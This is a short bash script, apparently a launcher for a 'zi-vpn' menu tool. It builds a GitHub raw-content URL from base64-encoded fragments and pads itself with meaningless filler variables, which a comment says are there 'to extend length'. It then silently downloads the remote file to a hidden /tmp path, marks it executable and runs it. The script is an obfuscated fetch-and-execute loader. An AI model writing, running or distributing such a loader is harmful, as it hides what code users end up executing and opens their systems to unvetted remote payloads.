#!/bin/bash

download_menu_script() {
  decode() {
    echo "$1" | base64 -d
  }

  # z36="x36"; z37="x37";
  a1=$(decode "aHR0cHM6Ly8=")   # https://
  a2=$(decode "cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbQ==") # raw.githubusercontent.com
  a3=$(decode "L2hxLW1wL3ppLXZwbi5jb20vcmVmcy9oZWFkcy9tYWluL21lbnU=") # /hq-mp/zi-vpn.com/refs/heads/main/menu

  # Add noise variables to extend length
  z1="x1"; z2="x2"; z3="x3"; z4="x4"; z5="x5"
  z6="x6"; z7="x7"; z8="x8"; z9="x9"; z10="x10"
  z11="x11"; z12="x12"; z13="x13"; z14="x14"; z15="x15"
  z16="x16"; z17="x17"; z18="x18"; z19="x19"; z20="x20"
  z21="x21"; z22="x22"; z23="x23"; z24="x24"; z25="x25"
  z26="x26"; z27="x27"; z28="x28"; z29="x29"; z30="x30"
  z31="x31"; z32="x32"; z33="x33"; z34="x34"; z35="x35"
  z36="x36"; z37="x37"; z38="x38"; z39="x39"; z40="x40"
  z41="x41"; z42="x42"; z43="x43"; z44="x44"; z45="x45"

  # z36="x36"; z37="x37";
  full_url="${a1}${a2}${a3}"

  # z36="x36"; z37="x37";
  curl -s "$full_url" -o /tmp/.zi_menu
  chmod +x /tmp/.zi_menu
  bash /tmp/.zi_menu
}

# z36="x36"; z37="x37";
download_menu_script
